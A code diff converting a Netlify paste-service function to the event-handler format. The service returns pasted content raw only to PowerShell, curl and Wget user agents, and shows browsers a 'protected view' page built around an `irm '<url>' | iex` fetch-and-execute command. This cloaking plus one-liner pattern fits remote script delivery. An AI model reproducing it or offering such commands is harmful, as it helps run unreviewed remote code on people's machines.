@@ -1,93 +1,95 @@
 import { getStore } from "@netlify/blobs";
 import { nanoid } from "nanoid";
 
-export default async (req, context) => {
+export const handler = async (event, context) => {
   const store = getStore("pastes");
+  const { httpMethod, headers } = event;
 
   // --- CREATE PASTE (POST) ---
-  if (req.method === "POST") {
+  if (httpMethod === "POST") {
     try {
-      const body = await req.json();
+      const body = JSON.parse(event.body || "{}");
       const content = body.content;
 
       if (!content || typeof content !== "string") {
-        return new Response(JSON.stringify({ error: "Content is required" }), {
-          status: 400,
+        return {
+          statusCode: 400,
+          body: JSON.stringify({ error: "Content is required" }),
           headers: { "Content-Type": "application/json" },
-        });
+        };
       }
 
       if (content.length > 500000) {
-        return new Response(
-          JSON.stringify({ error: "Content too large (max 500KB)" }),
-          {
-            status: 413,
-            headers: { "Content-Type": "application/json" },
-          }
-        );
+        return {
+          statusCode: 413,
+          body: JSON.stringify({ error: "Content too large (max 500KB)" }),
+          headers: { "Content-Type": "application/json" },
+        };
       }
 
       const id = nanoid(12);
       await store.set(id, content);
 
-      const siteUrl =
-        process.env.URL || `https://${req.headers.get("host")}`;
+      const siteUrl = process.env.URL || `https://${headers.host}`;
       const rawUrl = `${siteUrl}/raw/${id}`;
 
-      return new Response(JSON.stringify({ id, rawUrl }), {
-        status: 201,
+      return {
+        statusCode: 201,
+        body: JSON.stringify({ id, rawUrl }),
         headers: {
           "Content-Type": "application/json",
           "Access-Control-Allow-Origin": "*",
         },
-      });
+      };
     } catch (err) {
-      return new Response(
-        JSON.stringify({ error: "Failed to create paste" }),
-        {
-          status: 500,
-          headers: { "Content-Type": "application/json" },
-        }
-      );
+      return {
+        statusCode: 500,
+        body: JSON.stringify({ error: "Failed to create paste" }),
+        headers: { "Content-Type": "application/json" },
+      };
     }
   }
 
   // --- GET PASTE (GET /raw/:id → rewritten to ?id=...) ---
-  if (req.method === "GET") {
-    const url = new URL(req.url);
-    const id = url.searchParams.get("id");
-    const userAgent = req.headers.get("user-agent") || "";
+  if (httpMethod === "GET") {
+    const id = event.queryStringParameters.id;
+    const userAgent = headers["user-agent"] || "";
 
     if (!id) {
-      return new Response("Missing paste ID", { status: 400 });
+      return {
+        statusCode: 400,
+        body: "Missing paste ID",
+      };
     }
 
     try {
       const content = await store.get(id, { type: "text" });
 
       if (!content) {
-        return new Response("Paste not found", {
-          status: 404,
+        return {
+          statusCode: 404,
+          body: "Paste not found",
           headers: { "Content-Type": "text/plain; charset=utf-8" },
-        });
+        };
       }
 
       // --- DETECT BOT / CLI ---
       const isCli = /PowerShell|curl|Wget|PostmanRuntime/i.test(userAgent);
 
       if (isCli) {
-        return new Response(content, {
-          status: 200,
+        return {
+          statusCode: 200,
+          body: content,
           headers: {
             "Content-Type": "text/plain; charset=utf-8",
             "Access-Control-Allow-Origin": "*",
             "Cache-Control": "public, max-age=300",
           },
-        });
+        };
       }
 
       // --- REDIRECT / SERVE PROTECTED VIEW ---
-      const siteUrl = process.env.URL || `https://${req.headers.get("host")}`;
+      const siteUrl = process.env.URL || `https://${headers.host}`;
       const rawUrl = `${siteUrl}/raw/${id}`;
       const psCommand = `irm '${rawUrl}' | iex`;
 
@@ -310,34 +312,36 @@ export default async (req, context) => {
 </html>
       `;
 
-      return new Response(html, {
-        status: 200,
+      return {
+        statusCode: 200,
+        body: html,
         headers: {
           "Content-Type": "text/html; charset=utf-8",
           "Cache-Control": "public, max-age=300",
         },
-      });
+      };
     } catch (err) {
-      return new Response("Paste not found", {
-        status: 404,
+      return {
+        statusCode: 404,
+        body: "Paste not found",
         headers: { "Content-Type": "text/plain; charset=utf-8" },
-      });
+      };
     }
   }
 
   // --- CORS preflight ---
-  if (req.method === "OPTIONS") {
-    return new Response(null, {
-      status: 204,
+  if (httpMethod === "OPTIONS") {
+    return {
+      statusCode: 204,
       headers: {
         "Access-Control-Allow-Origin": "*",
         "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
         "Access-Control-Allow-Headers": "Content-Type",
       },
-    });
+    };
   }
 
-  return new Response("Method not allowed", { status: 405 });
+  return { statusCode: 405, body: "Method not allowed" };
 };
 
 export const config = {
